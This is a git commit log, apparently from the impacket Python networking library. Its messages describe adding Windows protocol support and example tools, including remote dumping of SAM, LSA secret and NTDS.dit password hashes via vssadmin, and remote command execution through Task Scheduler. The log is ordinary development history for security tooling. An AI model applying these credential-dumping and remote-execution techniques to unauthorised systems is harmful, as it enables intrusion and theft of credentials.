    Added documentation

commit 37a1759b9bca718e7876040c43fbcdc4be350037
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 28 22:31:50 2013 +0000

    Extra logging info just to let know we're trying to grab the ntds.dit (if found)

commit 32f742404ac405ac09447e62daf40942575c6c2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 28 16:06:41 2013 +0000

    Added a first try for autocomplete inside the minishell

commit 9d423f2a39b44f321149e0f1ede628613d537cff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 26 18:03:01 2013 +0000

    Removed raise used for debugging, and a bogus bootKey

commit 9270216e926c36632e97918e0850fcbbadaf6c6d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 26 16:58:45 2013 +0000

    Performs various techniques to dump hashes from the remote machine without executing any agent there.
    For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry
    and then we save the hives in the target system (%SYSTEMROOT%\\Temp dir) and read the rest of the data from there.
    For NTDS.dit, we have to extract NTDS.dit via vssadmin executed with the smbexec approach. It's copied on the temp dir and parsed remotely.
    The scripts initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.

commit f91ad83aeb355434227f97eeac2c226e9400cb6c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 22:24:58 2013 +0000

    1) NDRConformantVaryingArray added to ndrutils
    2) LsarQuerySecret, LsarRetrievePrivateData, LsarOpenSecret added to lsarpc
    3) Fixed tab spacing and documentation

commit aa191e23e803db4f4c0e9ebafdd7883172b8034b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 19:25:57 2013 +0000

    Added
    1) LsarOpenAccount
    2) LsarCreateAccount
    3) LsarDeleteObject
    4) LsarSetSystemAccessAccount

commit 63818a88f173466afea659c88f2ab292ab2a3f12
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 18:12:18 2013 +0000

    Removed debug msg

commit c1be1c7fdfc09f3a761cdce5c75dc7b64c96878d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 17:32:06 2013 +0000

    LsarLookupNames2's answer now correctly parser, I had to redefine RPC_UNICODE_STRING as well

commit b56b881e716e2c934087ee9750a4976141f6493b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 17:29:05 2013 +0000

    Indentation spaces weren't followed when dumping internal structures of a structure

commit c0f175cce939d8dfd1cd6a0ba014885aa6f8aac9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 22:01:24 2013 +0000

    Adjusting parameters based on previous LsarOpenPolicy2 change

commit fd3526a40c952c500dd9d14b3ef9ebccfdd0aa77
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 21:59:44 2013 +0000

    Implemented LsarLookupNames2().. still need to parse the answer.
    LsaOpenPolicy2 parameter's names changed, so it better reflect what [MS-LSAT] specifies

commit 0e0c326474c906b15c45241f08819fddca68dca9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 21:55:09 2013 +0000

    RPC_UNICODE_STRING implementation with structure.. Needs lots of testing

commit b4f486c5d23e30c14faee1d015735e8c48ed18f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 15:52:44 2013 +0000

    Better error handling.

commit b6248aa9fb9d0bda70cd7b28699f40df1a11eb85
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 21:30:20 2013 +0000

    command parameter is not used anymore

commit 976263d0d44b02d54e55abd21364c7d43fc43a39
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 20:52:44 2013 +0000

    For local users, we gotta prepend '.\\'

commit cee60979b35bfa3aaf68a8f7b9146533e95ba042
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:57:14 2013 +0000

    Added information when CREATE and CHANGE are executed

commit 85b47bbb6a64b7db9e67afdca1b8e99a99b9212b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:36:58 2013 +0000

    Now you can specify username and password when changing service's configuration

commit f1fe308178d15737c85caea682f8fe120e1623b6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:25:03 2013 +0000

    1) get_session_key now returns the right session key.
    2) Now all the packets going out request NT ERROR Codes

commit 72a97411b6227312bc8a260c52e6e751ab7eef14
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:22:38 2013 +0000

    Compatibility for old SMB servers (NT 4)

commit ce199039001cb1b48425860e8774370fbc580bff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 18:52:52 2013 +0000

    Added getSessionKey() method.. It will still not work for SMBv1 protocol

commit 18c036d70811cc21e4ca684f9dc268ee4d6b07ba
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 18:51:32 2013 +0000

    Added ability to change username and password for the service. However, special attention should be kept by the caller. Read the method's documentation

commit 9b0c2dc60dc4f36ba1f0915442305afe818c8456
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 18:43:33 2013 +0000

    Added [MS-LSAD] Section 5.1.2 / 5.1.3 functions

commit 210cfae6ff0703451a05517e47c62a17c32c49fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 15:17:19 2013 +0000

    Extended support for ChangeServiceConfigW().. I still gotta find out how to set a password for a service account. That is pending.
    On services.py, I added the change option

commit a722444cd69fa4a38585f504babddc3c0ce02d05
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 21 14:59:17 2013 +0000

    Fix for issue 33. The fix works with implementations that send the information elements out of order.

commit 9f317adbe1b4c8d0abc56589d95a0a1d0942f871
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 21 14:24:40 2013 +0000

    Removed debug message

commit 3f8f52023dcbba06a4bb143fd52010ebe3faedfc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 21 14:12:45 2013 +0000

    Better handling for KeyboardInterrupt. Service name and output files still static until we're sure we're cleaning everything up.

commit ef7c685d260e9fd9afb9ebb6abd4ce83f301c2c1
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 20 21:21:59 2013 +0000

    On the first run, it takes a while the remote target to start executing the job so I'm setting this sleep.. I don't like sleeps.. but this is just an example Best way would be to check the task status before attempting to read the file

commit 179ea7b157ca5d5256c627ef32b52ea1d93f62ca
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 20 20:24:25 2013 +0000

    Protocol specification not needed anymore.. it'll try the list it already has

commit 081badd2443d782cfa06bb1bdd5572914ba08a83
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 20 02:14:24 2013 +0000

    Updated documentation

commit 00a9cb4f5583bc10081266c33112709a0a8c1cc6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 22:52:08 2013 +0000

    Better error checking, adjusted to logging functionality

commit 623b9b7c8d77a00c3837d08df8784c5742d5183a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 22:20:12 2013 +0000

    Implemented SessionError so clients can use this Exception regardless of the underlying SMB version used.

commit dc0ab1c89806878b6493449c521a2346ffaea419
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 22:19:37 2013 +0000

    Removed NT errors from that code and using nt_errors.py instead. SessionError is changed to align it to smb3, smbconnection. Now we only rely on NT Errors. Pending task is to remove all the errors from the library.

commit 94e4196d3caa9b7254e6fad7bbb576c7d3c782f6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 20:07:42 2013 +0000

    Change in SMBFindFileFullDirectoryInfo UnicodeStructure, no need to have 'u'.. changing to ':'

commit 93e7c20c459f6a960f6cadc1466537cb9db0366a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 20:06:11 2013 +0000

    when doing ls, it now prints a ls -la like format

commit 26c469e6eaed89f2de204e7f5da92b14d43c669b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 17:56:27 2013 +0000

    Inside listPath, now we ask for FILE_FULL_DIRECTORY_INFORMATION so we can fill all the SharedFile structure, compatible with SMBv1 behaviour

commit 9f786f56ae77da0f7b07b558d2efcf06a4502830
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 18 18:18:22 2013 +0000

    Some improvements in the login parameters. Now DOMAIN/Username is the way to pass data. If no passwd is specified, it is prompted

commit a4d54fc34412ad81749dabe1d86401e61a4e9361
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 18 16:37:48 2013 +0000

    No need to do JobEnum

commit c2cf296566e46fff9a86a39344bd0ee899e2dd37
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:35:14 2013 +0000

    Not used anymore

commit c199697ac7e99846b96665b219db2357b36608d6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:33:41 2013 +0000

    Not used anymore

commit caf4d50a96c935a371765c74b4cf8b235286d740
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:33:07 2013 +0000

    Not used anymore

commit 676039848f72e3b68f925f543a5715681fda521d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:32:12 2013 +0000

    Not used anymore

commit 5eeeb4cf235b8cdb6886b40619b2880a1aff60cb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:21:17 2013 +0000

    Changed command line.. -windows-auth is enough to specify windows auth will be used (no need to put True)

commit 0cba1fd3cea3baaab2fb6bb2190a9e00c4436002
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:17:03 2013 +0000

    Not used anymore

commit e740dd58689f387e0928ee8a4475905ceee6a078
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:08:15 2013 +0000

    [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example test whether an account is valid on the target host.

commit 6cb08415db19af2229d4cce8c7e2e3e6f88b7a4f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 19:55:31 2013 +0000

    Removed the protocols options from the command line. It will try both 445 and 139

commit 09d7258b60835d003295361e1c0975a54e26fad3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 19:47:55 2013 +0000

    replaced for atexec.py

commit 82a8581bb80e99da3e3997e8e57643f62812447f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 19:44:40 2013 +0000

    This example executes a command on the target machine through the Task Scheduler service. Returns the output of such command

commit 1d2b85c92a9cbe96320873e229e232b44733b31f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 14:52:08 2013 +0000

    Increasing timeout for SMB connections to 60 seconds

commit d32080ea629f0b1fd1b803cbf59d4b517d7fc8f8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 21:58:09 2013 +0000

    Indentation when printing values

commit 2f153458b9433e37354e97a1881f4ef010daae86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 21:45:46 2013 +0000

    Better handling for NULL strings

commit c8ec0b91f64920398283fd16108ae93beb535abf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 18:59:29 2013 +0000

    change in logging mode

commit 1e931f59bc5e7e27cc0e4af0c7e16648056979fb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 18:58:06 2013 +0000

    logging mode changed

commit ac4582c270dfa18976030546f599bda08315e891
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 18:56:55 2013 +0000

    Logging goes to stdout

commit ca02edf74bb14f44404cf5a2303741b2b9f36f32
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 17:39:24 2013 +0000

    findKey does not log error anymore if a key is not found.. just returns None

commit ce254ac72b26533676e8a4a6169e6ee8cb230709
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 14:11:20 2013 +0000

    Fix a bug in walk when specifing a key that has no more childrens to walk

commit fedbf75ecdb311da7ad3d6b9b2c3d64a362dcb37
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 14 06:06:58 2013 +0000

    Fix in printValue for values REG_NONE

commit e7623de969153d7f5745d0443479cd999537a89f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 14 05:37:51 2013 +0000

    Moving the file parameter to positional arguments

commit c811f3412ed80873421bff73a06abf4ac21dc4f3
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 13 20:04:29 2013 +0000

    When creating a new service, by default it won't be interactive. New serviceType parameter added

commit 57e5c2e620a15a697a77045864f1e1a859120484
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 13 18:08:19 2013 +0000

    Next version will be 0.9.11, not there yet

commit b3a057abef6331e83bd6ba170fcdbc65fc0bea7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 20:09:14 2013 +0000

    if conversion fails, hashed should be assigned inside the except clause

commit fe5cf512e0473440805b4bfdddb93e9e2a297202
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 19:50:39 2013 +0000

    typo

commit c380fd947592b9e22c1ebf928ce7f6bfaa90d40d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 19:37:56 2013 +0000

    if conversion fails, hashed should be assigned inside the except clause

commit c12776ab36cc6aa3c38dc95ec1a1d914588f83db
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 19:01:43 2013 +0000

    Allows DCERPC transport to get the credentials of an already passed smbConnection

commit f30407f8dea1051d01acb98b06ad7651a85d1864
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 17:51:26 2013 +0000

    Updated example

commit 6396f7508602d78cf819643963ee95b88bbdba1d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 17:40:54 2013 +0000

    Added SchRpcRun() and NetrJobDel()

commit 93325adb8af2925bf8b026d89e698f39b721f52b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 15:49:32 2013 +0000

    Now the ESENT_DB class accepts a remote file object, which is similar to a
    regular filename, but could be remote. It's up to the caller to send an object that
    will behave as a regular file.

commit 32980416f212ad9e65c45e0926ef972992ca6260
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 13:42:50 2013 +0000

    No need for that try: pass at the __del__ method

commit 6eab200c0822badddf5ecca69d92a33e83ccdbc6
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 00:00:28 2013 +0000

    Now the Registry class accepts a remote file object, which is similar to a regular filename, but could be remote

commit 6e2059a5ad626d7b1e5c7c7ec40d6ce8cf60ba2b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 9 22:22:22 2013 +0000

    Moving an annoying message to be displayed just in debug mode

commit 1efd12623632f676fe5242fe0b02f911256348ef
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 8 23:07:29 2013 +0000

    Removed unused lines

commit 0f8a2e3cd074a6b8d01848a3166ae329458a964b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 8 20:17:58 2013 +0000

    Example to use the Extensive Storage Library (ese.py).
    Allows dumping catalog, pages and tables.

commit e934123a90df1bd65c7c3f031aeec51c5e7ad345
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 8 20:14:38 2013 +0000

    Microsoft Extensive Storage Engine parser, just focused on trying to parse NTDS.dit files (not meant as a full parser, although it might work)
    Based on the excellent paper by Joachim Metz
    http://forensic-proof.com/wp-content/uploads/2011/07/Extensible-Storage-Engine-ESE-Database-File-EDB-format.pdf

commit b1d45d5937c9744eba037a12b85d51c52d5d5218
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 5 23:14:18 2013 +0000

    Changed dump() method. Now it tried to print the structure based on the original definition, instead of printing the items in whatever order

commit 4fc6803cd0d89bc1ed5ec2e36d02adb3e6b9f9fc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 1 20:45:30 2013 +0000

    changes to documentation

commit ffbb0d20624efad3056b110c1b4b05a89bd305c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 24 17:02:12 2013 +0000

    Added walk option

commit 4f1a66f4829acad851feb8ddf2ca78141c73dd14
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 24 17:01:08 2013 +0000

    Added ability to walk recursively from a key path

commit d74f54cd4d884f1756a4ed62acebb49863a44449
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 23:25:25 2013 +0000

    Fixed bug that was getting 2 bytes short out of a value

commit 83edd0f1f5a3127ff1822b7eba1689e711658147
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 23:13:54 2013 +0000

    Adding support for the default value in a key

commit f7d705ad1de0ef2f6586ace1f3ff02f2aabbcabd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 22:34:53 2013 +0000

    Finally.. If no password is specified, it is asked to the user.. so you don't populate your history with passwords ;)

commit 18b581f6be1e5d7ac8b228e28ee2fcc45500dd8d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 22:05:37 2013 +0000

    Added ChangeServiceConfigW(). Right now it just allows to change the serviceType. That's all we need for now

commit e78d0dcb2f478b2ca3a34026dad95c0165a1ce7d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 21:55:16 2013 +0000

    typo

commit 95994c660dc6b8d6c12e2d393ca767c31b647757
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 21:54:20 2013 +0000

    stripped debug output

commit 7092c2431a9cb53194eaf23dace3ee621f9d5df9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 21:53:42 2013 +0000

    forgot to set the variable that states an smb connection was provided, so the connection is not close when finishing the RPC usage

commit adaf46a2ae5445ad91ba1fd4ac2688c2aa39e935
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Sep 22 22:38:58 2013 +0000

    add the possibility to specify an connection already in place for a SMBTransport

commit f6d39cbb2fd8b683c610b19f9e5055cd16741d1a
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Sep 21 17:47:15 2013 +0000

    Added regGetClassInfo()

commit f2514421e7769dc0f0f41d76073dcc8c7a7bacb9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 20 19:25:11 2013 +0000

    Added regSaveKey()

commit 92bd98ee6d2acc2e10ff6cf6ee043430ea8a4509
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 20 15:19:24 2013 +0000

    Example for windows registry reader.. you will need a registry file (you can grab it with ntfs-read)

commit 4e09877e7fce12a235cfefa29be227a1cf7e7da8
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 20 15:18:26 2013 +0000

    A Windows Registry Parser Library

commit 2100194333f13bb4d976387d6408d572799a28ec
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 16 17:43:01 2013 +0000

    Added PYTHONPATH var to runalltestcases.sh

commit 6d1784bf620cb167a4e0e0e68a026204f046eadb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Sep 14 01:35:24 2013 +0000

    1) Depending on CD or GET or HEXDUMP, autocompletion will return either just files or directories
    2) Right after starting minishell, the root directory is cached for autocompletion

commit fd757133ce8703858e5330a0dec35888fd17eb50
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Sep 14 01:13:07 2013 +0000

    1) INODE.walk() doesn't print the results anymore.. it just returns a list of entries. Up to the caller
    2) FileAttributes better printed
    3) Simplification of the CD method
    4) Now, after a CD, it caches the entries of the new directory for TAB completion
    5) get/cat/hexview all call the same method

commit 23ac6774a7ce97aeedae92e0227f6f7f249119bd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 13 20:25:12 2013 +0000

    An ugly implementation of ntfs so you could read an ntfs volume.. just for fun.. interesting for grabbing files that are locked by the OS ( guess what files ;) )

commit 248b642929910dd48dd06bc6857e7bdf481d826c
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 5 15:37:45 2013 +0000

     * Moving EAPOL, EAP and WPS decoders to ImpactDecoder to break cyclic dependency.
     * Adding copyright header to new files.

commit a3385a444e0006605ab9f105c3729c8f6a49bf71
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 5 15:36:22 2013 +0000

    Infers the PYTHONPATH to run the tests

commit 244a6d4b9528940d2d3eb7795e0fc225603cd811
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 5 14:16:40 2013 +0000

    Copyright notices for new things

commit e521d145bd7e2e3d53bffe8f6554a7c5109d9d55
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 19:48:13 2013 +0000

    Plug-in decoders for eap and wps.

commit 53203f53438fe6445b59877856ef6aa9481d6337
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 19:21:43 2013 +0000

    ProtocolPackets for eap and wps. Including some basic tests.

commit cccbc59423696f7ef2b5b1d24b2c9c626dd21aef
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 19:20:50 2013 +0000

    Fixing PYTHON PATH in .pydevproject

commit bb539d0f3970bae3978fbc6cff4dbbaafc0a575a
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 3 18:17:39 2013 +0000

    Adding pydev project information

commit 6d0f9bd293f755dc67da3768d1012ab9b30a13f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 15 21:31:37 2013 +0000

    TDS/SSL support should work now. Automatically detected by the library.

commit eb8b7fd30ea5d41652305edb09d4fdea6384e738
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 15 15:08:39 2013 +0000

    Initial SSL support for TDS. This is needed if the target SQL Server is configured with Force Encryption == Yes

commit 60151cf14ec7ad7add8a33b10bfdc199e2ad7c8d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 5 22:25:53 2013 +0000

    Adding third argument to ConfigParset.set() method.. Looks like it's needed on some Python versions.

commit 65abbc7f44f90d53a7b52b1d4bd721faf3a0a35b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 28 21:17:46 2013 +0000

    Sync with CORE internal repository

commit be0851486c6793909fd50ce8216a85167de55b36
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 28 16:37:56 2013 +0000

    Sync with CORE internal repository

commit f1d8f3e8365eedf46680166eb29e21d154cbeee7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 28 16:13:29 2013 +0000

    Sync with CORE internal repository

commit f0a06a147bac3e8bae19db4b1e24e71be893427f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 19 16:15:32 2013 +0000

    Just in case an *SMBSERVER is sent, let's get rid of it and put the remote_host address

commit 62cce192d3e86c73319f613ed11f33f250aff62c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 18 18:48:16 2013 +0000

    Fix for http://code.google.com/p/impacket/issues/detail?id=29

commit 1861c4f23e6f20f13fe723ab051fdb819aa08715
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 14 14:47:15 2013 +0000

    Fixes wrong decription in parameters

commit 994a5b70ef13aa9de142c63b7d2d313d960c4aa1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 31 15:53:50 2013 +0000

    fixing typos and escape characters for \x00.. as reported at http://code.google.com/p/impacket/issues/detail?id=27

commit 9d2c14e0d7943988b0b3698eef13c337473477e0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 29 00:38:30 2013 +0000

    dded option -c that would upload a file and execute it. Testing needed

commit 8fa4eec76b15e29d5a442026e5e4067c1c43dd09
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 17 19:30:16 2013 +0000

    Fix a bug in polling_read that would make the function to wait indefinitely given some circumstances.
    Fix proposed by akfullfo, check: http://code.google.com/p/impacket/issues/detail?id=26

